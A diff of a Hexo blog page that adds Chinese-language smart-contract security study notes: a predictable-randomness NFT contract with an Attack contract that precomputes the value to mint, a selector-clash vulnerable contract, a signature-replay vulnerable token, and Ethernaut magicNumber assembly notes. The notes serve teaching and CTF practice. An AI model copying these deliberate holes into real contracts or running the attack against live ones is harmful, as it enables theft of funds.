@@ -73,6 +73,263 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-区块链安全/其他/randomNumber" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/randomNumber/" class="article-date">
+  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/randomNumber/">jump</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一个现象：<br>在合约中两个不同的地方调用block.timeStamp，只要是在同一笔交易中，那结果就是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BadRandomness is ERC721 &#123;</span><br><span class="line">    uint256 totalSupply;</span><br><span class="line"></span><br><span class="line">    // 构造函数，初始化NFT合集的名称、代号</span><br><span class="line">    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint</span><br><span class="line">    function luckyMint(uint256 luckyNumber) external &#123;</span><br><span class="line">        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number</span><br><span class="line">        require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;);</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, totalSupply); // mint</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function attackMint(BadRandomness nftAddr) external &#123;</span><br><span class="line">        // 提前计算随机数</span><br><span class="line">        uint256 luckyNumber = uint256(</span><br><span class="line">            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</span><br><span class="line">        ) % 100;</span><br><span class="line">        // 利用 luckyNumber 攻击</span><br><span class="line">        nftAddr.luckyMint(luckyNumber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/randomNumber/" data-id="clus3dvlh0017joud8ltyc3md" data-title="jump" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-区块链安全/其他/网络基本知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" class="article-date">
+  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">selector crash</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这篇文章旨在帮助扫盲平时读文章，解决问题可能遇到的网络相关知识，内容不是很深，主要是概念扫盲汇总</p>
+<p>代理：帮助用户隐藏自己的ip地址，在访问网站时使用代理提供的ip地址<br>（原理是代理替代用户进行访问，然后将访问到的内容传输给用户），但无法隐藏用户想要传送的数据，会将数据原文发送给代理端进行传输</p>
+<p>vpn：同上，不同的是vpn可以加密想要传输的数据（隧道技术），用户端需要安装软件，在软件上完成加密，将密文传输给代理商，再传输给目标网站<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image.png" alt="Alt text"></p>
+<p>适配器：原本不能连接的硬件（软件），有了适配器以后，就可以通过适配器来连接了，clash就是一种适配器<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image-1.png" alt="Alt text"></p>
+<p>dns：domain name server，用来将域名解析成为ip地址的ip，网络上有很多的DNS网站<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image-2.png" alt="Alt text"><br>这里的首选dns服务器地址和clash的ip没有什么关系，<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/image-3.png" alt="Alt text"><br>也就是说这里填的是ipv4地址</p>
+<p>网址和域名的关系：<br>一般的网址格式为：&lt;协议&gt;:∥&lt;服务器类型&gt; . &lt;域名&gt;&#x2F;&lt;目录&gt;&#x2F;&lt;文件名&gt;；<br>比如：<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/444755817#:~:text=%E5%9F%9F%E5%90%8D%EF%BC%9A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E6%98%AF%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E9%97%B4%E7%9B%B8%E4%BA%92%E8%81%94%E7%BB%9C%E7%9A%84%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E3%80%82%20%E7%BD%91%E5%9D%80%EF%BC%9A%E6%9F%90%E4%B8%80%E7%BD%91%E7%AB%99%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E5%BB%BA%E7%AB%8B%E7%9A%84%E5%8F%AF%E4%BE%9B%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%9A%84%E5%9C%B0%E5%9D%80%E3%80%82,%E4%BB%8E%E5%9F%9F%E5%90%8D%E4%B8%8E%E7%BD%91%E5%9D%80%E7%9A%84%E5%90%AB%E4%B9%89%E4%B8%AD%E5%B0%B1%E8%83%BD%E5%A4%9F%E7%9C%8B%E5%87%BA%EF%BC%8C%E2%80%9C%E7%BD%91%E5%9D%80%E2%80%9D%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BD%9C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%B9%B3%E5%B8%B8%E6%89%80%E8%AF%B4%E7%9A%84%E2%80%9C%E9%93%BE%E6%8E%A5%E2%80%9D%EF%BC%9B%20%E8%80%8C%E2%80%9C%E5%9F%9F%E5%90%8D%E2%80%9D%E9%99%A4%E4%BA%86%E8%83%BD%E5%A4%9F%E4%BD%9C%E4%B8%BA%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%EF%BC%8C%E4%B9%9F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%9B%B4%E5%83%8F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E8%BA%AB%E4%BB%BD%E6%A0%87%E8%AF%86%E3%80%82">https://zhuanlan.zhihu.com/p/444755817#:~:text=%E5%9F%9F%E5%90%8D%EF%BC%9A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E6%98%AF%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%E9%97%B4%E7%9B%B8%E4%BA%92%E8%81%94%E7%BB%9C%E7%9A%84%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E3%80%82%20%E7%BD%91%E5%9D%80%EF%BC%9A%E6%9F%90%E4%B8%80%E7%BD%91%E7%AB%99%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E5%BB%BA%E7%AB%8B%E7%9A%84%E5%8F%AF%E4%BE%9B%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%9A%84%E5%9C%B0%E5%9D%80%E3%80%82,%E4%BB%8E%E5%9F%9F%E5%90%8D%E4%B8%8E%E7%BD%91%E5%9D%80%E7%9A%84%E5%90%AB%E4%B9%89%E4%B8%AD%E5%B0%B1%E8%83%BD%E5%A4%9F%E7%9C%8B%E5%87%BA%EF%BC%8C%E2%80%9C%E7%BD%91%E5%9D%80%E2%80%9D%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BD%9C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%B9%B3%E5%B8%B8%E6%89%80%E8%AF%B4%E7%9A%84%E2%80%9C%E9%93%BE%E6%8E%A5%E2%80%9D%EF%BC%9B%20%E8%80%8C%E2%80%9C%E5%9F%9F%E5%90%8D%E2%80%9D%E9%99%A4%E4%BA%86%E8%83%BD%E5%A4%9F%E4%BD%9C%E4%B8%BA%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%EF%BC%8C%E4%B9%9F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E5%90%8D%E7%A7%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%9B%B4%E5%83%8F%E6%98%AF%E4%BC%81%E4%B8%9A%E6%88%96%E6%9C%BA%E6%9E%84%EF%BC%88%E5%93%81%E7%89%8C%EF%BC%89%E5%9C%A8%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%8A%E6%B3%A8%E5%86%8C%E7%9A%84%E8%BA%AB%E4%BB%BD%E6%A0%87%E8%AF%86%E3%80%82</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" data-id="clus3dvlw001bjouddm7h4hsx" data-title="selector crash" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-区块链安全/其他/选择器碰撞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/" class="article-date">
+  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/">selector crash</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract SelectorClash &#123;</span><br><span class="line">    bool public solved; // 攻击是否成功</span><br><span class="line"></span><br><span class="line">    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。</span><br><span class="line">    function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Not Owner&quot;);</span><br><span class="line">        solved = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。</span><br><span class="line">    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123;</span><br><span class="line">        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S02_SelectorClash">从这里可以找到合适的找到碰撞的工具</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/" data-id="clus3dvlx001cjoud59nh9n0b" data-title="selector crash" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-区块链安全/其他/重放攻击" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/" class="article-date">
+  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/">重放攻击</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="签名重放"><a href="#签名重放" class="headerlink" title="签名重放"></a>签名重放</h3><p><a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S06_SignatureReplay">签名空投的时候没有对已经使用过的签名进行标记</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 权限管理错误例子</span><br><span class="line">contract SigReplay is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">    address public signer;</span><br><span class="line"></span><br><span class="line">    // 构造函数：初始化代币名称和代号</span><br><span class="line">    constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123;</span><br><span class="line">        signer = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 有签名重放漏洞的铸造函数</span><br><span class="line">     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">     * amount: 1000</span><br><span class="line">     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b</span><br><span class="line">     */</span><br><span class="line">    function badMint(address to, uint amount, bytes memory signature) public &#123;</span><br><span class="line">        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));</span><br><span class="line">        require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash</span><br><span class="line">     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">     * amount: 1000</span><br><span class="line">     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be</span><br><span class="line">     */</span><br><span class="line">    function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(abi.encodePacked(to, amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 获得以太坊签名消息</span><br><span class="line">     * `hash`：消息哈希 </span><br><span class="line">     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span><br><span class="line">     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`</span><br><span class="line">     * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。</span><br><span class="line">     */</span><br><span class="line">    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;</span><br><span class="line">        // 32 is the length in bytes of hash,</span><br><span class="line">        // enforced by the type signature above</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ECDSA验证</span><br><span class="line">    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123;</span><br><span class="line">        return ECDSA.recover(_msgHash, _signature) == signer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/" data-id="clus3dvly001fjoud1h7y5egh" data-title="重放攻击" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-区块链安全/ethernaut/magicNumber" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/" class="article-date">
+  <time class="dt-published" datetime="2023-11-26T16:00:00.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/">magicNumber</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>不知道这道题在干什么？看看这个吧，这是这个题目的脚本<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image.png" alt="Alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solver solver = Solver(instance.solver());</span><br></pre></td></tr></table></figure>
+<p>如果小合约有不止一个方法可以自动调用吗</p>
+<p>###create方法</p>
+<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-4.png" alt="Alt text"></p>
+<p>这整个是合约的创建时代码<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-2.png" alt="Alt text"></p>
+<p>这是合约的运行时代码，因为在return里面<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-3.png" alt="Alt text"></p>
+<p>这个时候，如果将ffffffff换做可以运行的代码呢</p>
+<p>比如：创建一个名为whatisthemeaningoflife()的方法并只返回42这个数字</p>
+<p>但是利用assembly我并不知道怎么创建出一个特定名字的方法，怎么办呢<br>  是否能试着创建一个receive呢？<br>  开始我怎么知道这是reveive？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address deployedContractAddress;</span><br><span class="line">assembly &#123;</span><br><span class="line">    let ptr := mload(0x40)</span><br><span class="line">    mstore(ptr, shl(0x68, 0x69602A60005260206000F3600052600A6016F3))</span><br><span class="line">    deployedContractAddress := create(0, ptr, 0x13)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<p>EIP1167</p>
+<p>当需要空头的合约很多时，创建合约的费用达到了一定的值，这个时候就需要降低合约的成本<br>所以，EIP1167就是：<br>以最小的代价拷贝一个已有合约的实现，减少gas费用消耗，提升数据安全<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-1.png" alt="Alt text"></p>
+<p>###对比分析 - eip1967可升级合约的beacon批量代理方案<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/image-8.png" alt="Alt text"><br>图中的访问logic合约是用delegatecall实现的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/magicNumber/" data-id="clus3dvl8000sjoud2d8l1xor" data-title="magicNumber" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-区块链安全/其他/magicChallenge" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/25/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/magicChallenge/" class="article-date">
+  <time class="dt-published" datetime="2023-11-25T13:22:20.028Z" itemprop="datePublished">2023-11-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>思路一：在_transfer中做文章，想办法让selltime多减一次</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/25/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/magicChallenge/" data-id="clus3dvlh0016joud02h3hta3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-readme/经济" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/" class="article-date">
@@ -121,7 +378,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/" data-id="clufjd1920007ekudaf3bgpuo" data-title="经济" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/" data-id="clus3dvkv000bjoud2dff2qfa" data-title="经济" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -209,7 +466,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/" data-id="clufjd19e0013ekudfuq72n2k" data-title="assembly" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/" data-id="clus3dvl5000ojoudb44ielco" data-title="assembly" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -249,7 +506,7 @@
       
     </div>
     <footer class="article-footer">
